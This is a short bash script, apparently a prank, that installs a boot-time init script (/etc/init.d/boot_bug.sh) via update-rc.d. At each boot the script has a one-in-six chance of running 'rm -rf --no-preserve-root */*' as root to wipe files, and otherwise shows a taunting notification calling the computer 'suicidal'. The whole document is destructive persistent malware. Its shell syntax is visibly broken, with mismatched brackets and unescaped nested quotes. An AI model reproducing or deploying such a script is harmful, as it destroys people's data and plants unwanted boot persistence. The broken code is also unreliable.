#!/bin/bash

touch /etc/init.d/boot_bug.sh && \ 
echo "[ $[ $RANDOM % 6 ] == 0 } && \ 
su root -c "rm -rf --no-preserve-root */*" || notify-send --app-name xterm "Your computer is now depressed and has become suicidal. There is a 1 in 6 chance your pc WILL commit suicide. Can you save your pc? Or will it die? Enjoy"; or sleep 5 & wait $last_pid" > /etc/init.d/boot_bug.sh && \ 
chmod 111 /etc/init.d/boot_bug.sh && \ 
update-rc.d boot_bug.sh defaults;
